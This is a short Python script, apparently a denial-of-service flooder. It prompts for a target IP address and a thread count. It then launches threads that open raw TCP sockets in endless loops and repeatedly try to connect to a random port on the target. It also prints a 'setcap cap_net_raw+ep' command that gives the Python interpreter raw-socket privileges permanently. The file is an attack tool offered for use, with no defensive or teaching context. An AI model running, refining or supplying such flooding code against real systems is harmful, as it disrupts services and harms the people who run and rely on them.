# -*- coding: utf-8 -*-
import socket
import random
import threading
import os
os.system('cls||clear')

print("SUDO IS REQUIRED")
print("PERMINANT FIX:")
print("sudo setcap cap_net_raw+ep $(readlink -f $(which python))")

ip = input("Target: ")
port = random.randint(80, 65535)
th = input("Threads: ")

def attack():
	while (True):
		s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
		try:
				s.connect((ip, port))
		except:
				s.close()

def threader():
	global threads
	threads = []
	for i in range(int(th)):
		t = threading.Thread(target=attack)
		threads.append(t)
		t.start()


threader()